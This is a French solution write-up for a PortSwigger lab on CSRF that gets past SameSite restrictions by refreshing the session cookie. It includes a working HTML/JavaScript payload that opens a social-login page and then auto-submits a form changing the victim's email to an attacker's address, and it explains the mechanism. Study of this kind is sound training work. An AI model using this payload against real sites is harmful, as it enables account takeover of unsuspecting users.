# Lab

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

## Solution

Sur le lab, quand on se connecte il n'y a pas de spécification sur le cookie `SameSite` donc il est par défaut à `Lax`. On peut donc utiliser la technique de `refresh` pour bypasser la protection.

```html
<form method="POST" action="https://0aea0006048751748115200e00920029.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@pwned.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0aea0006048751748115200e00920029.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

Lorsqu'un utilisateur clique n'importe où sur la page, le gestionnaire d'événement onclick est déclenché.

`window.open` est utilisé pour ouvrir une nouvelle page de connexion (`/social-login`) sur le même domaine. Cette action est considérée comme une "navigation de niveau supérieur" (comme cliquer sur un lien), ce qui est permis par `SameSite=Lax`.

Après un délai de 5 secondes, la fonction `changeEmail` est appelée, qui soumet automatiquement un formulaire. Ce formulaire a pour action de changer l'adresse e-mail de l'utilisateur à une valeur contrôlée par l'attaquant (`pwned@pwned.net`).

Le contournement de `SameSite=Lax` se produit ici car l'ouverture de la page `/social-login` via window.open est considérée comme une action initiée par l'utilisateur. Cette action est permise par `SameSite=Lax`, et en conséquence, les cookies (y compris ceux avec `SameSite=Lax`) sont envoyés avec la requête. Une fois que la nouvelle page est chargée (et potentiellement les cookies de session sont confirmés), la soumission du formulaire se fait dans ce contexte authentifié, permettant ainsi l'attaque CSRF.